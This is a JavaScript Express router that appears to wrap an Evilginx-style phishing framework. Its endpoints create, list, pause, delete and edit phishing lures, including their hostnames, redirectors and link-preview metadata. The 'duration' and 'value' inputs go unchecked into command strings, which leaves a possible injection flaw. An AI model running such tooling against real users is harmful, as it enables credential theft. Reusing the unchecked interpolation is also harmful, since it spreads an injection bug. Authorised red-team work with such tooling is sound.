import { Router } from 'express';
import { runAndParse } from '../lib/runCommand.js';

const router = Router();
const ID_RE = /^[0-9]+$/;
// No underscore — see the matching comment in routes/phishlets.js.
const NAME_RE = /^[a-zA-Z0-9-]+$/;

router.get('/', async (req, res) => {
  try {
    res.json(await runAndParse('lures'));
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

router.post('/', async (req, res) => {
  const { phishlet } = req.body || {};
  if (!phishlet || !NAME_RE.test(phishlet)) return res.status(400).json({ error: 'valid phishlet name required' });
  try {
    await runAndParse(`lures create ${phishlet}`);
    const list = await runAndParse('lures');
    res.json(list);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

router.get('/:id/url', async (req, res) => {
  const { id } = req.params;
  if (!ID_RE.test(id)) return res.status(400).json({ error: 'invalid id' });
  try {
    const result = await runAndParse(`lures get-url ${id}`);
    res.json(result);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

router.delete('/:id', async (req, res) => {
  const { id } = req.params;
  if (!ID_RE.test(id)) return res.status(400).json({ error: 'invalid id' });
  try {
    const result = await runAndParse(`lures delete ${id}`);
    res.json(result);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

router.get('/:id', async (req, res) => {
  const { id } = req.params;
  if (!ID_RE.test(id)) return res.status(400).json({ error: 'invalid id' });
  try {
    res.json(await runAndParse(`lures ${id}`));
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

router.post('/:id/pause', async (req, res) => {
  const { id } = req.params;
  const { duration } = req.body || {};
  if (!ID_RE.test(id)) return res.status(400).json({ error: 'invalid id' });
  if (!duration) return res.status(400).json({ error: 'duration is required, e.g. 1d2h3m4s' });
  try {
    res.json(await runAndParse(`lures pause ${id} ${duration}`));
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

router.post('/:id/unpause', async (req, res) => {
  const { id } = req.params;
  if (!ID_RE.test(id)) return res.status(400).json({ error: 'invalid id' });
  try {
    res.json(await runAndParse(`lures unpause ${id}`));
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

const EDIT_FIELDS = new Set([
  'hostname', 'path', 'redirector', 'ua_filter', 'redirect_url',
  'phishlet', 'info', 'og_title', 'og_des', 'og_image', 'og_url',
]);

router.post('/:id/edit', async (req, res) => {
  const { id } = req.params;
  const { field, value } = req.body || {};
  if (!ID_RE.test(id)) return res.status(400).json({ error: 'invalid id' });
  if (!EDIT_FIELDS.has(field)) return res.status(400).json({ error: `field must be one of: ${[...EDIT_FIELDS].join(', ')}` });
  if (value === undefined || value === null) return res.status(400).json({ error: 'value is required' });
  try {
    res.json(await runAndParse(`lures edit ${id} ${field} ${value}`));
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

export default router;
